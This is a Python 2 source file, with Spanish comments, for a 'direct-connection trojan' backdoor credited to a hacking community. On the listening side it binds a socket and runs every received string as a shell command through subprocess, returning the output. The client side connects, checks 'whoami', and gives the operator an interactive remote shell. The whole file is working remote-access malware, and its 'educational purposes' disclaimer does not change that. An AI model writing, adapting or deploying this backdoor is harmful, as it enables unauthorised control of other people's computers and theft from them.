# Desarrollado por Eric Alberto Martinez
# Hacking Publico & sistemas informaticos
# AguasHack - No Hacking No Fun
# Version 1.0
import sys, os
import socket
import getopt
import threading
import subprocess

# Definimos algunas variables globales
listen             = False
command            = False
target             = ""
port               = 0

# Vamos a definir una funcion que nos provea 
# de ayuda
def usage():
    print "\n\tTroyano de Conexion Directa"
    print 
    print "Uso: backdoor.py -t target_host -p port"
    print "-l --listen                       escuchar en [host]:[port]"
    print "-s --shell                      inicializa una shell"
    print
    print
    print "Ejemplos: "
    print "python backdoor.py -t 192.168.1.1 -p 5555 -l -s"
    print "\tPara dejar en escucha una shell"
    print "python backdoor.py -t 192.168.1.1 -p 5555"
    print "\tPara conectarse a una shell"
    print "\nSimple Backdoor de Conexion Directa para los"
    print "Miembros de la Comunidad de Hacking Publico & Sistemas Informaticos"
    print "el Creador de este codigo o cualquier Miembro de Hacking Publico"
    print "NO se hacen responsables por el uso que le puedan dar a este codigo,"
    print "el cual esta hecho con fines Educativos."
    sys.exit(0)

# Funcion que se encargara de el cliente
# osea la computadora que se conecta al 
# backdoor 
def client_sender():
    # Creamos el socket
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Hacemos la conexion al servidor/backdoor
        cliente.connect((target, port))
        # Aqui solo te pregunto tu nickname
        nickname = raw_input("Cual es tu nickname ? ")
        # Lo concateno (Tu nick) con otra cadena
        nickname += "@hacker ~:#"
        # Envio un whoami (Para que sepamos que 
        # usuario somos en el equipo comprometido)
        cliente.send("whoami")
        # Recibimos el usuario
        usuario = cliente.recv(1024)
        # Y lo imprimimos
        print "Eres el usuario: \t%s" % usuario
        
        while True:
            # Esperamos por mas input           
            buff = raw_input("%s " % nickname)
            
            # Enviamos comando
            cliente.send(buff)
            # El data es la respuesta del comando 
            # que Enviamos
            data      = cliente.recv(1024)

            print data
            
            # Si el comando es "exit"
            # nos desconectamos del servidor/backdoor
            # si es limpiar pantalla 
            # la limpiamos 
            try:
                if "exit" in buff:
                    cliente.send("exit")
                    cliente.close()
                    print "Bye, Bye!!!"
                    break     
                if "cls" or "clear" in buff:
                    if os.name('nt'):
                        os.system("cls")
                    else:
                        os.system("clear")
            except:
                continue
                        
    except:
        # Si hubo un error se produce una Excepcion
        # y salimos del script
        print "[*] Excepcion! Saliendo!!!"
        cliente.close()
        
def server_loop():
    global target
    
    # Si no indicamos la opcion -t
    # el server toma esta direccion
    if not len(target):
        target = "0.0.0.0"
    
    # Creamos el socket para las conexiones 
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    
    # Creamos un hilo por cada cliente que se conecte
    try:
        while True:
            client_socket, addr = server.accept()
            
            client_thread = threading.Thread(target=client_handler,
                                             args=(client_socket,))
            print "[*] Nuevo cliente conectado %s" % socket.gethostname()
            client_thread.start()
            
    except KeyboardInterrupt:
        print "Se ha detenido el server"
        sys.exit(1)        
        
        
def run_command(command):

    command = command.rstrip()

    
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, 
                                         shell=True)
    except:
        output = "Fallo al ejecutar el comando.\r\n"
 
    return output

def client_handler(client_socket):
    global command
     
    if command:
        while True:
            

            cmd_buff = client_socket.recv(1024)

            if "exit" in cmd_buff:
                print "El cliente %s se DESCONECTO." % socket.gethostname()
                client_socket.close()
                break                    
            
            response = run_command(cmd_buff)
            
            client_socket.send(response)
            
def main():
    global listen
    global port
    global command
    global target
    
    # aqui verificamos que el usuario haya
    # dado opciones, si no, imprime el modo
    # de uso (funcion usage() )
    if not len(sys.argv[1:]):
        usage()
    
    # Si el usuario dio opciones las leemos 
    # para verificar que sean validas, despues 
    # ejecutar lo correspondiente
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hlt:p:s", ["help", "listen", "target",
                                                             "port", "shell"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
    
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-s", "--shell"):
            command = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)     
        else:
            assert False, "Opcion no valida"
            
    if not listen and len(target) and port > 0:
        client_sender()
    if listen:
        server_loop()

main()
